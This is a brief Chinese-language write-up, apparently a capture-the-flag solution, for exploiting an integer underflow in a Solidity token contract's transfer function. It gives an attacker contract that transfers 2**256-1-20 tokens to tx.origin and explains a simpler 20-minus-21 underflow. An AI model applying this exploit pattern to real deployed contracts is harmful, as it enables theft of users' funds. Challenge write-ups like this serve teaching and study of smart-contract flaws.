


### method one
给`to`增加`2**256 - 1 - 20`，同时又需要满足msg.sender和to不是同一个地址
```js
pragma solidity ^0.4.24;

contract Token {
    function transfer(address _to, uint _value) public returns (bool);
}

contract TokenTest {
    Token t;
    constructor(address _token) public {
        t = Token(_token);
    }
    function transfer() public {
        uint _value = 2**256 - 1 - 20;
        t.transfer(tx.origin, _value);
    }
}
```

### method two
上面的方法比较笨拙，实际上`20-21=2**256-1>0`溢出，已经满足要求，所以，我们只要调用contract的transfer方法，to地址任意填写即可，当然to和msg.sender不能相同。

